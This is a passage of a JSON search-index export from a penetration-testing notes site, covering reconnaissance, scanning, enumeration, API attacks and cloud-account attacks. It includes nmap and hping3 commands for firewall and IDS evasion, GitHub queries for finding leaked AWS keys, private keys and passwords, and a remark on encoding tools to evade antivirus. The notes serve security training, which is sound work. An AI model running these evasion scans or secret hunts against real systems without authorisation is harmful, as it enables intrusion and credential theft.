    "t": "Introduction ",
    "c": "Introduction  What?  Recon strategies for gathering intel on a target. Why?  To discover all the possible ways of attacking a target before deciding on the most effective approach for web application hacking. How?  Manually walk through the target Scope discovery Other sneaky OSINT techniques Tech stack fingerprinting",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "3b4558c53e32c537879a01783be1762d",
    "u": "https://recon.tymyrddin.dev/docs/scanning/diving",
    "t": "Diving deeper in discovery ",
    "c": "Diving deeper in discovery  Identify live networks between source and already identified subnets Traceroute to the gateway or DNS server for each network Add newly identified networks to the list of subnets Discover the IP addresses of servers behind a DNS Discover how long a server has been up Where is a server’s physical location … Under the hood  Traceroutes work by manipulating the Time-To-Live (TTL) field in an IP packet. This field tells a device a packet is passing through how many more systems (or hops) a packet can pass through before being dropped. This is to ensure that lost packets do not just simply hop around the Internet forever and eventually, with enough lost packets clogs it up. The field is decremented as it passes through each network hop. When it reaches zero, a router will drop the packet being sent through it and send an ICMP Time-To-Live exceeded message back to the source. This can be used to determine the route to a host or network, the time it takes for a message to be sent and a response to be received by using a traceroute, which service provider the target is using There is an ICMP traceroute (tracert.exe, Windows) and a UDP traceroute (traceroute -l, all other OSs). ICMP traceroute expects all intermediary routers to respond with an ICMP TTL Exceeded message. Most do not (RFC 792) UDP traceroute is not so great where filtering is in place. Most Unix traceroute implementations now support TCP static port traceroutes out of the box. Mapping out DMZ and internal networks  Because all traceroutes work using ICMP TTL Exceeded messages, which protocol is used is not important as long as there is a known response. Use a TCP traceroute with a SYN flag set, and commonly open ports such as 25, 80 or 443 for which you can get a reliable response back once the target is reached. Uptime  Each time a server is patched or updated, it must also be rebooted. If a server has been up for a long time, we know it has not been patched or updated in that time, and that it will be vulnerable to all vulnerabilities discovered during that timeframe. Examples  Traceroute in nmap with Geo resolving: nmap --traceroute --script traceroute-geolocation.nse -p 80 [ip_or_hostname] The default packet which hping3 will create is a TCP packet: # hping3 -T -V --tr-stop -S -p 80 [ip_or_hostname] Specify the source and destination ports of the packet to help it bypass the firewall. Send three packets out ( -c ) to destination port 53 ( -p ) and set the SYN flag in the packet, so it looks like the first phase of the three-way handshake ( -S ): hping3 -c 3 -p 53 -S [ip_or_hostname] Traceroute in hping3 using a TCP scan to a specific destination port: # hping3 --traceroute --verbose --syn --destport [80] [ip_or_hostname] Discover the IP addresses of servers behind a DNS: # hping3 [big site hostname] -S -p 80 -T –ttl 13 –tr-keep-ttl -n Uptime of a server: # hping3 [ip_or_hostname] -p 80 –tcp-timestamp -S -c 4",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "77bef2e609a2bbb9d38d4b3ba1cf60fb",
    "u": "https://recon.tymyrddin.dev/docs/app/sneaky",
    "t": "Other sneaky OSINT techniques ",
    "c": "Other sneaky OSINT techniques  Engineering job listings often reveal the technologies the company uses. If you can’t find relevant job posts, search for employees’ profiles on LinkedIn, and read employees’ personal blogs or their engineering questions on forums like Stack Overflow and Quora. People’s work calendars often contain meeting notes, slides, and sometimes even login credentials. If an employee shares their calendars with the public by accident, you could gain access to these. The organisation or its employees’ social media pages might also leak valuable information. Like a sets of valid credentials on Post-it Notes visible in the background of office selfies??? If the company has an engineering mailing list, sign up for it to gain insight into the company’s technology and development process. Check for SlideShare or Pastebin accounts. Consult archive websites like the Wayback Machine . Tomnomnom’s tool Waybackurls can automatically extract endpoints and URLs from the Wayback Machine.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "563d3df639de5cc87ce98241d343a8a5",
    "u": "https://recon.tymyrddin.dev/docs/footprinting/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Gathering information about a target system that can be used to execute a successful attack. To get this information, use various methods with variant tools. Why?  Analyse the security posture of the target and find loopholes for creating an attack plan. Using different tools and techniques, narrow down the range of IP addresses. Use the collected information to identify weaknesses in the target’s security. Graphically represent the target’s network, so it can be used as a guide during the attack. How?  Gather network information Gather system information Collect organisation information",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "07424d82724b1a48d202f4f49f538fd1",
    "u": "https://recon.tymyrddin.dev/docs/api/functionality",
    "t": "Understand application functionality ",
    "c": "Understand application functionality  Enumerate the endpoints and identify the parameters that can be used to call the API. Use a tool like Postman to send requests to the API and see the response. Review the API documentation. This will help understand the functionality of the API and identify the attack surface. Resources  Using SOAP requests",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "17d2dcae1d0a060e2a5976096aaad82d",
    "u": "https://recon.tymyrddin.dev/docs/footprinting/organisation",
    "t": "Collect organisation information ",
    "c": "Collect organisation information  Employee information Organisation’s background Phone numbers Locations Advanced searches  Search engines can be used to gather information about the target organisation. Search results can include , and other information that could be useful. Search engines crawl the world wide web day and night to index new web pages and files. Sometimes this can lead to indexing confidential information: Information about employees Intranet information Login pages Documents for internal company use Confidential spreadsheets with usernames, email addresses, and even passwords Files containing usernames Sensitive directories Service version number (some of which might be vulnerable and unpatched) Error messages Google dorking  Google dorking is a technique which involves using a set of search operators and building complex queries. The operators that are used in Google hacking are called dorks. Email footprinting  Email footprinting involves collecting information from emails by monitoring the email delivery and inspecting the headers: IP address of the recipient Geolocation of the recipient Delivery information Visited links Browser and OS information Reading time Email headers contain information about the sender, subject, and recipient. All this information is valuable to hackers when planning to attack their target. Information contained in email headers include: Sender’s name IP/Email address of the sender Mail server Mail server authentication system Send and delivery stamp Unique number of the message Email tracking tools have the capability of tracking emails and inspecting their headers to extract useful information. The sender is notified of the email being delivered and opened by the recipient. Assets discovery  Assets discovery involves collecting all the company names owned by a main company and then all the assets of these companies: Find the acquisitions of the main company, this will give the companies inside the scope. Find the ASN (if any) of each company, this will give the IP ranges owned by each company. Use reverse whois lookups to search for other entries (organisation names, domains…) related to the first one (recursively). Shodan and SSL filters can be used to search for other assets (the SSL trick can be done recursively). Investigating social media  The private world of yesterday is now an online world. Everyone with a search engine has open access to social networks, government databases, and public records. Social media websites have become very popular for not only personal use but also for corporate use. Some social media platforms can reveal tons of information about the target. This is especially true as many users tend to overshare details about themselves and their work. To name but a few, it’s worthwhile checking the following: LinkedIn Twitter Facebook Instagram Google groups Social media scraping can automate discovering names, email addresses, phone numbers, biographies. Visit job listing sites  Job advertisements can also tell a lot about an organisation. In addition to revealing names and email addresses, job posts for technical positions could give insight into the target’s systems and infrastructure. The popular job posts might vary from one country to another. Make sure to check job listing sites in the countries where the target would post their ads. And it is always worth checking their website for any job opening and seeing if this can leak any interesting information.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "106e87e4f24df095e7d4f2ad32baaf0a",
    "u": "https://recon.tymyrddin.dev/docs/scanning/defence",
    "t": "Defence detection ",
    "c": "Defence detection  Check to see if a target is using a load balancing solution with the lbd (load balancing detector) command. To determine if the target is behind a web application firewall (WAF), use the wafw00f command. It may be needed to encode some attack tools to try to trick antivirus software into not seeing the code as being harmful. To detect what ports a firewall is forwarding on to a target, use the firewalk command. Is also available for nmap as firewalk.nse script.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "aba9d1f5df203926b310557f55850f83",
    "u": "https://recon.tymyrddin.dev/docs/scanning/war-dialing-driving-flying-shipping",
    "t": "War-dialing-driving-flying-shipping ",
    "c": "War-dialing-driving-flying-shipping  Discover wireless networks. War dialing  Large organisations usually have their phone numbers assigned in blocks from a local telephone company, and many have their own dialing prefix. This information was used in war dialing all the company phone numbers looking for a dial-up server. Once such a server was found, it was used for guessing account usernames. War driving  War-driving, sitting in a parking lot or in a building across the street with a laptop and a wireless NIC, looking for unsecured or poorly secured access points. War-driving has been made easy by programs such as Network Stumbler and Wellenreiter, which use consumer WiFi cards to automatically scan the airwaves for networks. These wardriving programs and databases are often correlated with global positioning system (GPS) data so that physical maps of these networks can be made. War strolling  War-strolling, simply walking around with wireless equipment looking for networks. War flying  War-flying, mounting antennas on a drone and flying it around as a variation on war-driving. War shipping  War-shipping, shipping someone a device that does wireless scans. It uses disposable, low-cost and low-power 3G-enabled single-board computers that are easy to build for under 100 euro, the proliferation of e-commerce deliveries and a command-and-control (C&C) server to remotely perform close-proximity attacks, regardless of the location of an adversary. It increases target accuracy dramatically. Hide a tiny device in a package and ship it off to the target to gain access to their network. Low build-cost means several can be shipped. The device can be tucked into the bottom of a packaging box or stuffed in a toy. While in transit, the device can do periodic basic wireless scans, similar to what a laptop does in war-driving when looking for Wi-Fi hotspots, and send its location coordinates via GPS back to the C&C server. Once having arrived it can be used for further attacks to gain a persistent foothold in the network. These attacks have their limitations. These include the amount of time it takes to perform the attack and the suspicions that arise when a car is detected circling a block hundreds of times with an auspicious antenna up top and a laptop in view, a drone circling around, and someone that seemingly aimlessly keeps wandering about. Resources  Stumbler is a tool for Windows that facilitates detection of Wireless LANs using the 802.11b, 802.11a and 802.11g WLAN standards. It runs on Microsoft Windows operating systems from Windows 2000 to Windows XP. A trimmed-down version called MiniStumbler is available for the handheld Windows CE operating system. The program is commonly used for wardriving, verifying network configurations, finding locations with poor coverage in a WLAN, detecting causes of wireless interference, detecting unauthorized (“rogue”) access points and aiming directional antennas for long-haul WLAN links. Wellenreiter is a wireless network discovery and auditing tool that supports Prism2, Lucent, and Cisco based cards. It is an easy to use Linux scanning tool. No card configuration has to be done and it is quite self-explanatory. It can discover networks (BSS/IBSS), and detects ESSID broadcasting or non-broadcasting networks and their WEP capabilities and the manufacturer automatically. DHCP and ARP traffic are decoded and displayed to give further information about the networks. An ethereal/tcpdump-compatible dumpfile and an Application savefile will be automatically created. Using a supported GPS device and the gpsd the location of the discovered networks can be tracked.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "c207b124e1029a5ec3c5e3be2aa1f2e0",
    "u": "https://recon.tymyrddin.dev/docs/footprinting/system",
    "t": "Gather system information ",
    "c": "Gather system information  Web server operating systems Server locations Users Passwords Website footprinting  Website footprinting is a technique in which information about the target is collected by monitoring the target’s website. Hackers can map the entire website of the target without being noticed. Website footprinting gives information about: Software Operating system Subdirectories  information Scripting platform Query details By examining the website headers, it is possible to obtain information about the following headers: Content-Type Accept-Ranges Connection Status Last-Modified Information X-powered-by Information Web Server Information Additional ways to gather information is through HTML Source Code and cookie examination. By examining the HTML source code, it is possible to extract information from the comments in the code, as well as gain insight into the file system structure by observing the links and image tags. Cookies can also reveal important information about the software that is running on the server and its behaviour. And by inspecting sessions, it is possible to identify the scripting platforms. Web spiders methodically browse a website in search of specific information. Information collected can be helpful in planning social engineering attacks. Cloning websites  Website mirroring or website cloning refers to the process of duplicating a website. Mirroring a website helps in browsing the site offline, searching the website for vulnerabilities, and discovering useful information. Websites may store documents of different format, which in turn may contain hidden information and metadata that can be analyzed and used in (planning) an attack. This metadata can be extracted with metadata extraction tools. Eyeing repositories  Look for hardcoded secrets: SQL passwords AWS access keys Google Cloud private keys API tokens Test accounts In GitHub search: # Sample of GitHub queries org:TargetName password org:TargetName aws_secret_access_key org:TargetName aws_key org:TargetName BEGIN RSA PRIVATE KEY org:TargetName BEGIN OPENSSH PRIVATE KEY org:TargetName secret_key org:TargetName hooks.slack.com/services org:TargetName sshpass -p org:TargetName sq0csp org:TargetName apps.googleusercontent.com org:TargetName extension:pem key Sensitive files discovery  Many tools for finding the URLs of sensitive files exist. One such tool is dirb , a web content discovery tool.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "167124ae5bf3c44da18ff419f98dfcf3",
    "u": "https://enum.tymyrddin.dev/docs/system/virtual",
    "t": "Scanning virtualised systems ",
    "c": "Scanning virtualised systems  Some systems may be running on virtual machines or containers. Depending on the configuration of the virtualisation environment, it may not be possible to communicate with some virtual machines and containers if they are not connected to the network or are configured to network with one another, but not the real network. In this scenario, set up a virtual machine to connect to the private virtual machine network to do a vulnerability scan or look for vulnerability scanners that can have an agent installed in the virtual machines to be scanned.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "e8b808f9d750cbb9239bf279386fb2dc",
    "u": "https://enum.tymyrddin.dev/docs/system/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  System enumeration is a process of connecting to and interrogating a network or system to retrieve information about that network or system. Take information already gathered during reconnaissance (like IP addresses) and during scanning (open ports) and gather as much data about the targets and services running on the targets, using a variety of techniques and tools. Why?  To discover potential attack vectors in the system, and further exploitation of the system. Items of great interest: Network services that are running but not in use. Default user accounts that have no passwords. User accounts that have a revealed password. Guest accounts that are active. Security tokens. How?  NetBios enumeration SNMP enumeration LDAP enumeration NTP enumeration SMTP enumeration DNS enumeration macOS enumeration Linux enumeration Windows enumeration Scanning virtualised systems Scanning cloud infrastructure",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "74b30184df57872ec1818e9eb7244f02",
    "u": "https://api.tymyrddin.dev/docs/notes/traditional",
    "t": "Try traditional injections ",
    "c": "Try traditional injections  Use API requests that are vulnerable to injection: Send input to be directly executed by the API’s supporting technologies (web application, database, or OS running on the server), bypassing input validation measures. Discover requests that accept user input Test for XSS/XAS Perform database-specific attacks or operating system injection",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "e71cac90d32de15351ea4dc6c19426bb",
    "u": "https://api.tymyrddin.dev/docs/notes/challenges",
    "t": "Challenges ",
    "c": "Challenges  By relying on APIs, developers can design modular applications that leverage the expertise of other applications. They no longer need to create their own custom software to implement maps, payment processors, machine-learning algorithms, or authentication processes. As a result, popular! Many modern web applications have been quick to adopt APIs. APIs have exploded applications’ attack surfaces. They are often poorly defended providing a direct route to their data. Many APIs lack the security controls that other attack vectors have in place. Complexity  A few common rules of API testing: An API should provide expected output for a given input The inputs should appear within a particular range and values crossing the range must be rejected Any empty or null input must be rejected when it is unacceptable Incorrectly sized input must be rejected … API testing is simple. Its implementation is not. Complexity explodes, with consequences. Use case propagation  Traditional UI testing is limited to testing the functionality of the application. A tester compares the output of a test against expected outcomes. API testing uses a different approach. Being the central hub of logic and the gateway to data for (usually several) interfacing applications, the number of use cases in API testing is near-infinite. As a results, the number of required tests can rapidly exceed the possible workload of the people responsible for test case design. Access to connected systems  APIs pull data from multiple other APIs and back-end systems. The architecture looks like the roots of a tree, and it is impossible to have access to every environment in this system. Emulation and mocking of inaccessible resources is usually chosen to avoid testing bottlenecks. For API testing, this does not reduce the load. It just pushes it to another place. Plus, emulating race conditions for performance and load testing may not be such a good idea. Synchronous and asynchronous methods  One API can link several microservices and other APIs. A single call on an API can produce a load of serial and parallel activities. The complexities of an API can grow exponentially when it is combined with other API calls. Testers then need to take the calling order of APIs into account in the test case design. API versioning  Versioning is another major cause of exploding the complexity in API testing. The API must identify missing values and allocate some default to allow an old version to work. It is entirely possible that some versions are called by some versions, but not by others.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "2c1388e7a3e715153de4f38df3687b83",
    "u": "https://api.tymyrddin.dev/docs/notes/authentication",
    "t": "Attack authentication ",
    "c": "Attack authentication  Check for bad passwords and password requirements, default credentials, verbose error messaging, and bad password reset processes, broken API authentication, no authentication whatsoever, a lack of rate limiting applied to authentication attempts, the use of a single token or key for all requests, tokens created with insufficient entropy, and JWT configuration weaknesses. Many of the gifts that keep giving from web applications for decades have been ported over to APIs, plus then some. Basic authentication testing Attack and manipulate API tokens",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "c1d0f6c1ea6818b9748df781859d23e1",
    "u": "https://api.tymyrddin.dev/docs/notes/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Notes on techniques used for: Leveraging vulnerabilities identified to successfully penetrate security controls, using mostly manual attacks with only some semi-automated support. Gaining access to web services application data and/or permissions (access) not previously available. Note: Exploitation of web services may not be possible given the security controls present, the complexity of the attack (undocumented, or not enough documentation/context), and the time allotment for testing. Why?  To overcome the challenges to build a meaningful and sustainable API testing practice. How?  Challenges Analyse API endpoints Fuzz deep and wide Rate limit tests Evasive techniques Attack authentication Exploiting authorisation Inject with mass assignment Try traditional methods",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "0b1b4919e3cfcfb78309390d725cfaa4",
    "u": "https://api.tymyrddin.dev/docs/notes/fuzzing",
    "t": "Fuzz deep and wide ",
    "c": "Fuzz deep and wide  To be able to craft requests to an API, and perhaps even already find some information disclosures, security misconfigurations, excessive data exposures, and logic flaws, fuzz all the things, including: Authentication, authorization & roles (privileges and permissions) Data input validation, handling & processing Encryption & sequencing Business logic, source code & parameter manipulation Results in validation of vulnerabilities that can or may be exploited.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "053b46df959da201622b9bc8a4d7fad2",
    "u": "https://cloud.tymyrddin.dev/",
    "t": "Head in the clouds ",
    "c": "Head in the clouds  Virtualisation technology in the cloud has become a huge resource to leverage, as it promises high availability and access to resources from anywhere. From individuals, enterprises to large conglomerates, nearly everyone is migrating towards the cloud. With this come often unseen threats because cloud environments are different from the traditional infrastructure. Test lab AWS tools Preparation Reconnaissance Enumeration Notes on techniques Introduction Challenges and problems Account and privilege attacks Cloud-centric attacks Abusing misconfigurations Hacking CI/CD pipelines Attacking and defending AWS  With millions of active customers, Amazon Web Services (AWS) is one of the most popular cloud service providers, hence also of importance to hackers. Gaining access to one such corporate AWS account can cost a company billions of dollars, and users their privacy and perhaps even their identity. IAM Introduction IAM enumeration Misconfigured trust policy Overly permissive permission I Dangerous policy combination I Dangerous policy combination II Overly permissive permission II Pass Role: EC2 Pass Role: Lambda Pass Role: CloudFormation API Gateway Introduction API gateway enumeration Verb tampering Misconfigured private API IAM based authentication Denial of service Poor Lambda authoriser More Bust-a-Kube flAWS 2 AWSGoat CloudGoat",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "7ae8589a1990324a901f1dfeb8c8c8bf",
    "u": "https://cloud.tymyrddin.dev/docs/notes/accounts",
    "t": "Account and privilege attacks ",
    "c": "Account and privilege attacks  Compromising API-based credentials: For AWS, this can be SSH keys, access keys, and secrets. For Azure, this can be credentials, keys, or certificates. Google even offers custom authentication methods. Credentials are stored somewhere. They may not be stored securely, and can end up in places where they should not be. When compromised, misconfigurations in identity and access management (IAM) schemes can lead to privilege escalation or account takeover for gaining full administrative access to a cloud account. Credential harvesting  Credential harvesting is one of the primary attack vectors for cloud environments. There are different approaches, but one of the most common is to mine source code repositories. Federated authentication  Federated authentication is becoming more common. It uses Security Assertion Markup Language (SAML) and takes organisational authentication to create an authentication token for the cloud service. This token can then be decrypted and assessed for authentication information by the cloud provider. The information shared from the organisation is part of a signed SAML assertion. With federated authentication, corporate credentials become very valuable and spraying attacks can get an attacker some level of access within an organisation to make privilege escalation, phishing, and other attacks easier. Account takeover  Account takeover is gaining pervasive access to an account: the attacker has privileges that are equivalent to the account owner. Usually as the result of spear phishing, misconfigured access, or privilege escalation from domain privileges into the cloud. This may go beyond the cloud account itself and into federated applications, cloud assets, hosted data, and network boundaries. Attack  Grant persistent access within the environment, resulting in pervasive access to data and commands Attacking OAuth and federation (SolarWinds) Create permissive policies that look benign Add certificates or access keys to a user controlled by an attacker Add persistence to applications that have elevated privileges within the account Assign malicious policies to users or systems Add permissions to existing policies Password spraying  In many cases, multifactor authentication will be in place and will mitigate these attacks, and in case vulnerable cloud interfaces are exposed, password spraying tools designed for common login services may not work. Use cloudspecific tools for password spraying. Remediation  Using common or weak passwords can make cloud accounts vulnerable to brute force attacks. The attacker can use automated tools to make guesses thereby making way into the account using those credentials. The results can lead to a complete account takeover. Reusing passwords. Using easily rememberable passwords. Resources  SAML assertions Undetected Azure Active Directory Brute-Force Attacks AWS Metadata service AWS Get access key info SolarWinds breach 2020 Amazon Fraud Detector launches Account Takeover Insights (ATI)",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "f00f086e6208cac74d4bf0c819605fca",
    "u": "https://cloud.tymyrddin.dev/docs/api/dos",
    "t": "Denial of service ",
    "c": "Denial of service  Usage plans can be used to configure throttling limits and quota limits on individual client API keys. However, if an API key gets leaked, even if the data revealed by the API might not be sensitive, the attacker can try to exhaust the usage plan request quota and cause disruption of the service. Objective: Exhaust the usage plan request quota and cause a denial of service.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "ab253b82fa0ddb2ef4fbfcc357e4e12f",
    "u": "https://cloud.tymyrddin.dev/docs/notes/misconfigurations",
    "t": "Abusing misconfigurations ",
    "c": "Abusing misconfigurations  Misconfiguration is a big reason why systems are exploited in on-premises environments and with cloud resources. Whether it is Software as a Service (SaaS), Platform as a Service (PaaS), or Infrastructure as a Service (IaaS), securing cloud asset configurations can be simple or very complex. The more sophisticated the platform, the more difficult it may be to secure the platform, and when moving into PaaS or IaaS, complexities can be huge, and mistakes are made more easily. The bigger the energy-saving promise, the bigger the entropy. Identity and access management  IAM consists of the users, groups, roles, and permissions of users and assets within a cloud environment. Permissions are explicit grants of access given to a user, group, or asset. Roles are designed to roll up permissions so that they can be used across different users, groups, or assets. They are built so that a specific task can be performed. Roles may nest other roles under them to perform a task. A best practice is to have roles assigned to groups and to place users in the groups, for role-based access control (RBAC). Applications and systems may also have permissions, including permissions to access other services, to create and destroy files within a data store, and to update certain cloud configurations. Federation attacks  These attacks do not exploit vulnerabilities in federated authentication products, but abuse legitimate functions after a local network or admin account compromise. Federation  Federation takes an identity provider and uses it as the authentication source for an environment. It uses technologies like OAuth, SAML, or OpenID to act as identity providers that can perform authentication outside an environment, then return data about the authenticated party so the platform itself can handle authorisation. This is secured with shared secrets, such as certificates. If those secrets are compromised, then the security of the federation is compromised. Some services allow more than one federated authentication source or multiple keys. Local network to cloud attack  Compromise on-premises components of a federated SSO infrastructure and steal the credential or private key that is used to sign Security Assertion Markup Language (SAML) tokens. Forge trusted authentication tokens to access cloud resources. Escalation  Gaining sufficient administrative privileges within a cloud tenant to add a malicious certificate trust relationship for forging SAML tokens: Leverage a compromised global administrator account to assign credentials to cloud application service principals (identities for cloud applications that allow the applications to be invoked to access other cloud resources). Invoke the application’s credentials for automated access to cloud resources (often email in particular) that would otherwise be difficult for the actors to access or would more easily be noticed as suspicious. Object storage attacks  Object storage is one of the most abused cloud components and are often due to misconfigurations. Identify storage that is accessible from an unauthenticated point of view identify storage that is accessible from an authenticated view Container attacks  Docker and Kubernetes share some common attack patterns (such as kernel exploits), but Kubernetes works off of kubelets, users, pods, secrets, and more, which have unique attack vectors. Containerisation  Docker is typically only used for small numbers of containers on a specific host and Docker Swarm is used for orchestration when there are a small number of systems with a small number of services. Kubernetes is better for systems that require orchestration across many nodes, and offers enterprise-level scalability and resiliency. Attack  Break out of containerised system Leverage container resources to further your access to other systems, or to the hosting system Remediation  Cloud service misconfigurations are the most common cloud vulnerability (misconfigured S3 Buckets). The most famous case was that of the Capital One data leak which led to the compromise of the data of roughly 100 million Americans and 6 million Canadians. The most common cloud server misconfigurations are: Improper permissions Not encrypting the data and differentiation between private and public data. Resources  Okta AWS federation Azure federation Google cloud federation OAuth SAML OpenID S3 Leaks Container Breakouts – Part 1: Access to root directory of the Host Container Breakouts – Part 2: Privileged Container Container Breakouts – Part 3: Docker Socket Snyk: Kernel exploits Threat matrix for Kubernetes Attacking and Defending Kubernetes: Bust-A-Kube – Episode 1",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "117bf72c53eedd74731f47621540303a",
    "u": "https://recon.tymyrddin.dev/docs/cloud/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Cloud recon. Focus on S3 first. The growing number of Amazon Web Services S3 “data leaks” are due to human intervention – specifically, users who have not correctly configured S3 bucket policies, and as a result, allow public access to S3. In general, a lack of understanding when implementing S3, or carelessness when evaluating what should or should not be available for public consumption. Why?  To gain information for initial access in the cloud. How?  Mapping endpoints and plan Investigating AWS S3 URLs",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "54d37ed8ae0101af9f5cf86095e2c0d5",
    "u": "https://recon.tymyrddin.dev/docs/scanning/service-and-os",
    "t": "Service and OS detection ",
    "c": "Service and OS detection  Detect Operating Systems Detect services Service and OS detection use different methods to determine the operating system or service running on a particular port. Detect services: # nmap -sV -T4 -Pn -oG ServiceDetect -iL $TARGETFILE OS detection: # nmap -O -T4 -Pn -oG OSDetect -iL $TARGETFILE",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "516b73f997f19907408cf9a557036fbf",
    "u": "https://recon.tymyrddin.dev/docs/api/parameters",
    "t": "Document key parameters ",
    "c": "Document key parameters  An API’s attack surface includes the inputs and outputs of the API. Using the inputs and outputs, determine the potential vulnerabilities in the API. These inputs and outputs include: API calls URL parameters Headers Cookies Web responses File uploads API keys Identify the inputs and outputs of the API: The inputs and outputs of an API can be identified by the endpoints that the API provides. Make requests to different endpoints, interacting with the resources that the API exposes. The responses that the API sends back will contain the information necessary to understand the structure of the data being returned. Resources  API Security Top 10 2019",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "17825e36126dfc3ace6f87d8ffb5728c",
    "u": "https://recon.tymyrddin.dev/docs/scanning/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Determine what hosts are available on the network, what services (application name and version) those hosts are offering, what operating systems (and OS versions) they are running, what type of packet filters/firewalls are in use … Why?  To find potential initial vulnerable attack vectors. How?  War-dialing-driving-flying-shipping Live host discovery Host discovery with ICMP (ping sweep) Host discovery with TCP Host discovery with UDP Port scanning Service and OS detection Diving deeper in discovery Defence detection Stealth scans Firewall evasion",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "d1fb7158db4895c0da090e1a0a4c25fd",
    "u": "https://recon.tymyrddin.dev/",
    "t": "Falconry ",
    "c": "Falconry  Getting to know the target using methods like researching publicly available information and network scanning. Preparation Build a local testlab Footprinting Introduction Gather network information Gather system information Collect organisation information Initial scanning Introduction War-dialing-driving-flying-shipping Live host discovery Host discovery with ICMP Host discovery with TCP Host discovery with UDP Port scanning Service and OS detection Diving deeper in discovery Defence detection Stealth scans Firewall evasion Canopy of apple-blossom Introduction Manually walk through the target Scope discovery Other sneaky OSINT techniques Tech stack fingerprinting API Mayhem Introduction Collect data Understand application functionality Analyse traffic Document key parameters Check for exposed secrets Head in the clouds Introduction Mapping endpoints Investigating AWS S3 URLs Pocketful of acorns Introduction Passive reconnaissance Recon of facilities",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "738465a0e68d71e161decdd51698ce1f",
    "u": "https://recon.tymyrddin.dev/docs/footprinting/network",
    "t": "Gather network information ",
    "c": "Gather network information  Domains Subdomains IP addresses Whois and DNS records Whois and IP Geolocation  Whois databases contain domain owners’ personal information and are maintained by the Regional Internet Registries. Thick whois contains all information from all registrars for the specified set of data. Thin whois contains limited information about the specified set of data. Whois query results typically include: Domain details Domain owner details Domain server Net range Domain expiration Creation and last update dates Regional Internet Registries, which maintain the whois databases, include: Reseaux IP Europeens Network Coordination Centre (RIPE) American Registry for Internet Numbers (ARIN) Asia-Pacific Network Information Centre (APNIC) Latin America and Caribbean Network Information Centre (LACNIC) Africa’s NIC (AFRINIC) IP Geolocation  IP geolocation helps find location information about a target such as country, city, postal code, ISP, and so on. This informationis useful for (planning) social engineering attacks on the target. DNS footprinting  DNS footprinting involves collecting information about DNS zone data, which includes information about server types and locations of key hosts in the network. Network Footprinting  Network footprinting refers to the process of collecting information about the target’s network. During this process, attackers collect network range information and use the information to map the target’s network. Network range gives attackers an insight into how the network is structured and which machines belong to the network. Nmap can be used for network discovery. It uses raw IP packets to determine the available hosts on the network, the services offered by those hosts, operating systems they are running, firewall types that are being used, and other important characteristics. Traceroute programs uses the ICMP protocol and the TTL field in the IP header to discover a route to the target host. It records IP addresses and DNS names of discovered routers underway. This information can be used for man-in-the-middle and other related attacks. The results of a traceroute can also be used to collect information about network topology, trusted routers, and firewall locations, useful for creating network diagrams and planning attacks.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "b9473199958a0f7470288675561f1f33",
    "u": "https://recon.tymyrddin.dev/docs/cloud/map",
    "t": "Mapping endpoints ",
    "c": "Mapping endpoints  Collect information to identify assets a target has across all cloud providers. Identify services hosted with third-party companies. Map out all the endpoints: user interface, APIs, subnetworks, etc. for which testing is to be done. Decide which endpoints to exclude based on policy restrictions, user permissions, etc. Decide the route for performing the pentest: from application or database. Figure out how well the application server and VMs can take the load of the tests. Find out the laws that need to be followed while performing tests. Figure out which tools to use and what types of tests to do on which endpoints (Automated or Manual). Get approval for the plan from the client and inform them when you wish to begin.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "1ff9b63c2a2b9b13ace655d24f5a3566",
    "u": "https://recon.tymyrddin.dev/docs/scanning/firewall",
    "t": "Firewall evasion ",
    "c": "Firewall evasion  Fragment packets: # nmap -f <IP> Most firewalls and IDS detect fragmented packets. The nmap --mtu command allows for specifying offset size (has to be a multiple of 8). This is similar to the packet fragmentation technique. During the scan, nmap creates packets of that size, causing confusion to the firewall. # nmap --mtu [MTU] <IP> Decoy: # nmap -D RND:[number] <IP> Idle zombie scan: # nmap -sI [zombie] <IP> Manually specify a source port: # nmap --source-port [port] <IP> Append random data: # nmap --data-length [size] <IP> Randomize target scan order: # nmap --randomize-hosts <IP> Spoof MAC address: # nmap --spoof-mac [MAC|0|vendor] <IP> Send bad checksums: # nmap --badsum <IP> The badsum command deploys an invalid TCP/UDP/SCTP checksum for packets transmitted to the target. Practically every host IP stack will correctly drop the packets, so each response accepted is possibly originating from a firewall or Intrusion Detection System that was not concerned with confirming the checksum.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "60ee3fc55140efa070290625facf78dd",
    "u": "https://recon.tymyrddin.dev/docs/scanning/tcp",
    "t": "Host discovery with TCP ",
